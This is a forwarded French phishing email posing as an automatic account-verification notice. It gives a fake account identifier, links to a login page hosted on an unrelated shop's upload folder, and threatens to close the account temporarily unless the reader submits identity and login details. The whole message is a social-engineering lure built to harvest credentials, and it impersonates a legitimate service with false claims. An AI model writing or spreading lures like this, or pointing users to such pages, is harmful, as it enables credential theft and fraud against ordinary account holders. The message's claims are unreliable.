 --Forwarded Message Attachment-- Bonjour, pendant une procedure automatique reguliere de verification, nous avons rencontre un probleme technique provoque par le fait que nous ne pourrions pas verifier les informations que vous avez fourni pendant l'enregistrement. Nous vous demandons de soumettre les informations necessaires pour que nous puissions verifier votre identite. Votre identifiant : CFDers4587-FR559804-BOXNPT648055 (http://www.dantelshop.com/uploads/message/quranbasics.com/1/2/login.htm) *Important* Nous avons demande quelques renseignements complementaires, ce qui va etre le cadre de processus d'ouverture de session securise. Ces informations complementaires seront posees lors de votre connexion avenir pour la securite, s'il vous plait fournir toutes les informations sur ces completement et correctement autrement pour des raisons de securite ,nous devons fermer votre compte temporairement. Nous vous remercions de votre prompte attention a cette question. S'il vous plait comprendre que cela est une mesure de securite destinee a vous aider et de proteger votre compte. Nous nous excusons pour tout inconvenient. 